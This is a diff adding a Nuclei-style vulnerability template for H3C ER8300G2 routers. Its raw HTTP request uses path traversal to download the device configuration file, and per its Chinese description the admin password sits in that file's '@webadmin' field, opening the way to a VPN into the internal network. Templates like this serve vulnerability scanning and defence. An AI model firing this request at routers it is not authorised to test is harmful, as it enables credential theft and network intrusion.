@@ -1,0 +1,27 @@
+id: h3c-ER8300G2-Any-user-login
+info:
+  name: H3C - Any user login
+  author: apple
+  severity: critical
+  description: H3C企业路由器（ER、ERG2、GR系列）存在任意用户登录,通过获取的配置文件可以登录创建vpn，从而渗透内网。此设备为ER8300G2，账号为admin，密码为响应数据包的@webadmin字段。
+  reference:
+    - 
+  tags: h3c,er
+http:
+  - raw:
+      - |+
+        GET /userLogin.asp/../actionpolicy_status/../ER8300G2.cfg HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/116.0
+        Accept: */*
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Connection: close
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '@webadmin'
